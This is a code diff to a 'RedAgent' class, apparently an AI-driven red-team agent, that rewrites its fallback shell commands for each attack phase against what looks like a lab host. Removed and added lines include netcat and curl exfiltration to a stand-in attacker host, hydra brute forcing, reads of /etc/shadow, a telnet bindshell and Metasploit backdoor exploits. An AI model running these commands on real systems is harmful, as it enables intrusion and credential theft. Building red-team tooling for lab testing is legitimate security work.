@@ -376,11 +376,11 @@ class RedAgent(EnhancedAgentBase, MemorySyncInterface):
             # Quick validation and fallback
             if not command or not isinstance(command, str) or len(command.split()) < 2:
                 fallback_commands = {
-                    "recon": "nmap -sV 10.10.10.10",
-                    "enumeration": "gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/common.txt",
-                    "exploit": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10",
+                    "recon": "nmap -sV -sC -p- 10.10.10.10",
+                    "enumeration": "mysql -h 10.10.10.10 -u root -e 'show databases'",
+                    "exploit": "telnet 10.10.10.10 1524",
                     "privesc": "find / -perm -u=s -type f 2>/dev/null",
-                    "exfiltrate": "zip -r /tmp/data.zip /etc/passwd",
+                    "exfiltrate": "cat /etc/shadow",
                 }
                 command = fallback_commands.get(phase, "echo 'Fallback command'")
             
@@ -405,11 +405,11 @@ class RedAgent(EnhancedAgentBase, MemorySyncInterface):
             console.print(f"[red]❌ GPT error: {e}. Using fallback.[/red]")
             # Immediate fallback without further processing
             fallback_commands = {
-                "recon": "nmap -sV 10.10.10.10",
-                "enumeration": "gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/common.txt", 
-                "exploit": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10",
-                "privesc": "find / -perm -u=s -type f 2>/dev/null",
-                "exfiltrate": "zip -r /tmp/data.zip /etc/passwd",
+                "recon": "nmap -sV -sC -p- 10.10.10.10",
+                "enumeration": "showmount -e 10.10.10.10",
+                "exploit": "telnet 10.10.10.10 1524",
+                "privesc": "sudo -l",
+                "exfiltrate": "cat /etc/shadow",
             }
             command = fallback_commands.get(phase, "echo 'Error fallback'")
             gpt_reason = f"Fallback command for {phase} after error"
@@ -468,34 +468,34 @@ class RedAgent(EnhancedAgentBase, MemorySyncInterface):
                         # Emergency fallback for diversity
                         fallback_commands = {
                             "recon": [
-                                "nmap -sV -v --script vuln",
+                                "nmap -sV -sC -p- --script vuln",
                                 "masscan -p1-65535 --rate 1000",
-                                "dnsenum --enum",
-                                "fierce -dns"
+                                "nmap -sU --top-ports 20",
+                                "showmount -e"
                             ],
                             "enumeration": [
-                                "enum4linux",
-                                "gobuster dir -e -u http://target",
-                                "nikto -host",
-                                "smbclient -L"
+                                "mysql -h target -u root -e 'show databases'",
+                                "psql -h target -U postgres -c '\\l'",
+                                "smbclient -L //target -N",
+                                "smtp-user-enum -M VRFY -U /tmp/users.txt -t target"
                             ],
                             "exploit": [
-                                "hydra -l admin -P wordlist ssh://",
-                                "sqlmap -u --forms --batch",
-                                "wpscan --url --enumerate u",
-                                "msfconsole -q -x \"use exploit/multi/http/...\""
+                                "telnet target 1524",
+                                "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor'",
+                                "msfconsole -q -x 'use exploit/multi/samba/usermap_script'",
+                                "ssh msfadmin@target"
                             ],
                             "privesc": [
                                 "sudo -l",
                                 "find / -perm -u=s -type f 2>/dev/null",
                                 "uname -a",
-                                "unzip linpeas.sh && ./linpeas.sh"
+                                "cat /etc/crontab"
                             ],
                             "exfiltrate": [
-                                "tar -czf data.tar.gz /home/user/",
-                                "nc attacker 4444 < data.zip",
-                                "python3 -m http.server",
-                                "base64 secret.txt | curl --data-binary @-"
+                                "cat /etc/shadow",
+                                "tar -czf /tmp/data.tar.gz /home/",
+                                "python3 -m http.server 8888",
+                                "base64 /etc/passwd"
                             ]
                         }
                         
